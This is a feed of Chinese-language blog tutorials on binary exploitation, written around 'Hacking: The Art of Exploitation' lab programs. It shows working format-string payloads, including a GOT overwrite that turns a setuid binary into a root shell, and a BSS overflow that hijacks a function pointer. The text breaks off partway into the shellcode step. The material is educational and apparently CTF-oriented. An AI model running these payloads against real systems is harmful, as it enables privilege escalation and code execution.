      <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。</li><li>在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。</li><li>可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。但是对于像printf这种可变参数的函数来说，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数调用者传入的格式一个一个的打印出数据。</li><li>测试环境ubuntuX86<h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4></li><li><p>如下是函数printf format的参数、输入类型以及输出类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| Parameter  |  Input Type | Output Type                    |</span><br><span class="line">| - - - - - -| - - - - - - | - - - - - - - - - - - - - - -  |</span><br><span class="line">| %d         | Value       | Decimal                        |</span><br><span class="line">| %u         | Value       | Unsigned decimal               |</span><br><span class="line">| %x         | Value       | Hexadecimal                    |</span><br><span class="line">| %s         | Pointer     | String                         |</span><br><span class="line">| %n         | Pointer     | Number of bytes written so far |</span><br></pre></td></tr></table></figure></li><li><p>试想有这样一种情况，我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是它传入的参数，哪些是属于函数调用者的数据。</p></li><li>vuln code<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#fmt_vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">   char text[1024];</span><br><span class="line">   static int test_val = -72;</span><br><span class="line"></span><br><span class="line">   if(argc &lt; 2) &#123;</span><br><span class="line">      printf(&quot;Usage: %s &lt;text to print&gt;\n&quot;, argv[0]);</span><br><span class="line">      exit(0);</span><br><span class="line">   &#125;</span><br><span class="line">   strcpy(text, argv[1]);</span><br><span class="line"></span><br><span class="line">   printf(&quot;The right way to print user-controlled input:\n&quot;);</span><br><span class="line">   printf(&quot;%s&quot;, text);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);</span><br><span class="line">   printf(text);</span><br><span class="line"></span><br><span class="line">   printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">   // Debug output</span><br><span class="line">   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;test_val, test_val, test_val);</span><br><span class="line"></span><br><span class="line">   exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编译指令：</span><br><span class="line">gcc -g fmt_vuln.c -o fmt_vuln</span><br><span class="line">sudo chown root fmt_vuln</span><br><span class="line">sudo chmod u+s fmt_vuln</span><br></pre></td></tr></table></figure><ul><li>当我们输入 AAAA%08x.%08x.%08x.%08x可以看到我们读取到了保存于栈中的数据（输入的AAAA），当然如果输入的%08x更多还会读取到栈中更多的数据<br><img src="/2018/04/07/格式化字符串漏洞/memread.png" alt=""></li><li>如果写入的AAAA是一个敏感的地址呢，比如指向敏感字符串的地址。<br><img src="/2018/04/07/格式化字符串漏洞/readspecifyadd.png" alt=""><h4 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h4></li><li>任意内存写入需要用到%n这个不常用的参数，它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针,通过%n我们就可以修改内存中的值了。还是原来的漏洞代码。</li><li><p>此外还需要$的配合，如下的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</span><br></pre></td></tr></table></figure></li><li><p>会打印输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7th: 70, 4th: 00040</span><br></pre></td></tr></table></figure></li><li><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5</p></li><li>使用short writes,一个四字节的值可以使用两个%hn去完成覆盖。</li><li>例如下面的输入  $(printf “\x30\xa0\x04\x08\x32\xa0\x04\x08”)%43699x%4\$hn%8738x%5\$hn 会将test_val地址的值修改为0xccddaabb<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ gdb -q </span><br><span class="line">gdb-peda$ p/h 0xaabb - 8</span><br><span class="line">Size letters are meaningless in &quot;print&quot; command.</span><br><span class="line">gdb-peda$ p/d 0xaabb - 8</span><br><span class="line">$1 = 43699</span><br><span class="line">gdb-peda$ p/d 0xccdd - 0xaabb</span><br><span class="line">$2 = 8738</span><br><span class="line">gdb-peda$ quit</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  123</span><br><span class="line">The right way to print user-controlled input:</span><br><span class="line">123</span><br><span class="line">The wrong way to print user-controlled input:</span><br><span class="line">123</span><br><span class="line">[*] test_val @ 0x0804a030 = -72 0xffffffb8</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  $(printf &quot;\x30\xa0\x04\x08\x32\xa0\x04\x08&quot;)%43699x%4\$hn%8738x%5\$hn</span><br><span class="line">The right way to print user-controlled input:</span><br><span class="line">0�2�%43699x%4$hn%8738x%5$hn</span><br><span class="line">The wrong way to print user-controlled input:</span><br><span class="line">0�2� ...</span><br><span class="line">[*] test_val @ 0x0804a030 = -857888069 0xccddaabb</span><br></pre></td></tr></table></figure></li></ul><h4 id="覆盖GOT表"><a href="#覆盖GOT表" class="headerlink" title="覆盖GOT表"></a>覆盖GOT表</h4><ul><li>可能会有人问能不能通过这种漏洞来getshell呢，答案是可以的，且方法不止一种，下面介绍一种相对来说简单且常用的方法，通过覆盖GOT表方法来getshell的trick，总体的思路就是程序最后要执行exit函数，我们覆盖exit函数的地址为shellcode的地址来达到getshell的目的。</li><li>我们知道一个程序可以使用共享库，那么它必然有一个存放了各个函数对应的地址的表，这个表就是PLT(procedure linkage table)。</li><li><p>使用objdump 查看plt section</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -d -j .plt ./fmt_vuln</span><br><span class="line"></span><br><span class="line">./fmt_vuln:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048360 &lt;printf@plt-0x10&gt;:</span><br><span class="line"> 8048360:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048366:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804836c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">08048370 &lt;printf@plt&gt;:</span><br><span class="line"> 8048370:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048376:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804837b:e9 e0 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">08048380 &lt;strcpy@plt&gt;:</span><br><span class="line"> 8048380:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048386:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804838b:e9 d0 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048396:68 10 00 00 00       push   $0x10</span><br><span class="line"> 804839b:e9 c0 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80483a0:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 80483a6:68 18 00 00 00       push   $0x18</span><br><span class="line"> 80483ab:e9 b0 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483b0 &lt;exit@plt&gt;:</span><br><span class="line"> 80483b0:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 80483b6:68 20 00 00 00       push   $0x20</span><br><span class="line"> 80483bb:e9 a0 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483c0:ff 25 20 a0 04 08    jmp    *0x804a020</span><br><span class="line"> 80483c6:68 28 00 00 00       push   $0x28</span><br><span class="line"> 80483cb:e9 90 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483d0 &lt;putchar@plt&gt;:</span><br><span class="line"> 80483d0:ff 25 24 a0 04 08    jmp    *0x804a024</span><br><span class="line"> 80483d6:68 30 00 00 00       push   $0x30</span><br><span class="line"> 80483db:e9 80 ff ff ff       jmp    8048360 &lt;_init+0x2c&gt;</span><br></pre></td></tr></table></figure></li><li><p>如上所示可以看到exit函数的相关跳转，但是这个plt section是READONLY即只读不可修改的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</span><br><span class="line"> 11 .plt          00000080  08048360  08048360  00000360  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br></pre></td></tr></table></figure></li><li><p>但如果仔细看的话，可以知道jmp    *0x804a01c 中的jmp地址并不是一个直接的地址，而是一个指针指向的地址，即exit函数的地址是存放在地址0x804a01c处的。</p></li><li>这些个地址是存在放另外的section的，叫做global offset table(GOT),它是可写的。然后通过objdump可以获取的到。<br><img src="/2018/04/07/格式化字符串漏洞/objgot.png" alt=""> </li><li><p>如上说明exit函数是在0x0804a01c这个地址上的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fmt_vuln $(printf &quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08&quot;)%49143x%4\$hn%12981x%5\$hn</span><br></pre></td></tr></table></figure></li><li><p>这次我们还是将shellcode放入到环境变量中，然后将exit函数的地址指向shellcode所存放的环境变量(这种一般是用在提权操作上,普通用户运行了setuid的程序)<br><img src="/2018/04/07/格式化字符串漏洞/shell1.png" alt=""><br><img src="/2018/04/07/格式化字符串漏洞/shell2.png" alt=""></p></li><li>如上，当程序调用exit函数的时候，通过PLT跳转并在GOT表中获取到了调用的地址,由于这个地址已经被修改为shellcode的入口地址，所以我们就获取到了root权限的shell。</li><li>可以写任意地址其实就提供了很多种可能性，只要是可写的内存且包含了程序执行流的都可以是写入的目标。<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li><li>这里就主要过程做了说明，想要真正理解还需要自己动手去实践。<br><a href="https://github.com/kevien/exploitcode/tree/master/formatstringexp" target="_blank" rel="noopener">github repo</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li><li>《Hacking the art of exploitation》0x352</li><li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/papers-9426.html</a></li><li>格式化字符串漏洞简介<br><a href="http://drops.xmd5.com/static/drops/binary-7714.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/binary-7714.html</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BSS段的溢出攻击</title>
      <link href="/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至seebug</span><br><span class="line">https://paper.seebug.org/548/</span><br></pre></td></tr></table></figure><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul><li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="noopener">wiki</a></li><li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li><li><p>from game_of_chance.c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// Custom user struct to store information about users </span><br><span class="line">struct user &#123;</span><br><span class="line">    int uid;</span><br><span class="line">    int credits;</span><br><span class="line">    int highscore;</span><br><span class="line">    char name[100];</span><br><span class="line">    int (*current_game) ();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">struct user player;     // Player struct</span><br></pre></td></tr></table></figure></li><li><p>其中game_of_chance 是如下图的一个小游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p></li><li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void input_name() &#123;</span><br><span class="line">   char *name_ptr, input_char=&apos;\n&apos;;</span><br><span class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </span><br><span class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</span><br><span class="line">   </span><br><span class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</span><br><span class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</span><br><span class="line">      *name_ptr = input_char;   // Put the input char into name field.</span><br><span class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</span><br><span class="line">      name_ptr++;               // Increment the name pointer.</span><br><span class="line">   &#125;</span><br><span class="line">   *name_ptr = 0;  // Terminate the string.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这个函数会接收用户输入的名字直到遇到换行符，所以这里并没有有效的限制用户输入，就意味着有可能被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if((choice &lt; 1) || (choice &gt; 7))</span><br><span class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</span><br><span class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</span><br><span class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</span><br><span class="line">             if(choice == 1)        // then point it at the selected game </span><br><span class="line">                player.current_game = pick_a_number;   </span><br><span class="line">             else if(choice == 2)                     </span><br><span class="line">                player.current_game = dealer_no_match;</span><br><span class="line">             else</span><br><span class="line">                player.current_game = find_the_ace;</span><br><span class="line">             last_game = choice;   // and set last_game.</span><br><span class="line">          &#125;</span><br><span class="line">          play_the_game();   // Play the game.</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>如果last_game 未设置，函数指针current_game 会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></li><li>我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li><li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p><ul><li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做我们想要做的事情。</li><li>nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li><li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li><li><p>这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</span><br></pre></td></tr></table></figure></li><li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 90 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048f15</span><br><span class="line"></span><br><span class="line">####### Pick a Number ######</span><br><span class="line">This game costs 10 credits to play. Simply pick a number</span><br><span class="line">between 1 and 20, and if you pick the winning number, you</span><br><span class="line">will win the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">10 credits have been deducted from your account.</span><br><span class="line">Pick a number between 1 and 20: The winning number is 11</span><br><span class="line">Sorry, you didn&apos;t win.</span><br><span class="line"></span><br><span class="line">You now have 80 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 80 credits] -&gt;  </span><br><span class="line">Change user name</span><br><span class="line">Enter your new name: Your name has been changed.</span><br><span class="line"></span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</span><br><span class="line">[You have 80 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048ca5</span><br><span class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</span><br><span class="line">You have won the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">You now have 180 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</span><br><span class="line">[You have 180 credits] -&gt;  </span><br><span class="line">Thanks for playing! Bye.</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</span><br></pre></td></tr></table></figure></li><li><p>可以看到函数被调用我们增加了100金币</p></li><li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p><ul><li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</span><br><span 